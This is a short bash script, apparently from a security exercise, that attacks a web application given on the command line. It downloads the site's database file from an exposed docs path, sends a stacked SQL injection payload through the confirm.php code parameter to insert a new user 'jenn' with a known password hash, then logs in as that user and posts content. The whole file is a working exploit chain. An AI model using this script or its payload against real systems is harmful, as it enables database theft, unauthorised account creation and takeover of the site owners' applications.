#!/bin/bash

url="$1";

rm response.txt;
#inserted sql code is
#insert into users values ('jenn', 'dc8f65f8d0ed7668429281b32170536042f88e14', '','1')
#dc8f65f8d0ed7668429281b32170536042f88e14 is the SHA-1 of 'jenn'
#insert into ref values (7,10)
etext="YXJtYWRpbGxvc2lsdmVy';insert%20into%20users%20values%20('jenn','dc8f65f8d0ed7668429281b32170536042f88e14','',1);insert%20into%20ref%20values%20(7,10);--"
a="$url/confirm.php?code=$etext"
logout="$url/logout.php"

#download the db 
curl "$url/docs/website_db.db" --output data.db >> response.txt
#insert new user into the db
curl -i -c cookies.txt $a >>response.txt;
curl -i -b cookies.txt $logout >>response.txt;
#log in as the new user
#username: jenn
#password: jenn
echo "username:jenn" >> credentials.txt
echo "password:jenn" >> credentials.txt
curl -i -c cookies.txt --data "username=jenn&password=jenn&form=login&submit=Login" "$url/post.php" >>response.txt;
#post as new user
curl -i -b cookies.txt --data "form=content&title=post created by jenn's code&content=wow sql injection is cool&type=1&submit=Post" "$url/post.php">>response.txt;



